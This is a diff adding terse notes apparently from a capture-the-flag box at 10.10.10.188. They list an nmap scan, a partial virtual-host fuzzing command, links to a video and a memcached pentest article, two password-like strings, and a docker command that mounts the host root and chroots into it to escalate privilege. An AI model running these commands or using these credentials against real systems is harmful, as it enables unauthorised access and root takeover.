@@ -1,0 +1,16 @@
+10.10.10.188
+
+nmap -sC -sV -p 22,80 10.10.10.188
+
+-w wordlist -u https://10.10.10.188 -H "Host: FUZZ" -fs 8193
+
+
+https://www.youtube.com/watch?v=DJSQ8Pk_7hc
+
+H@v3_fun
+
+https://www.hackingarticles.in/penetration-testing-on-memcached-server/
+
+0n3_p1ec3
+
+docker run -v /:/mnt --rm -it ubuntu chroot /mnt sh
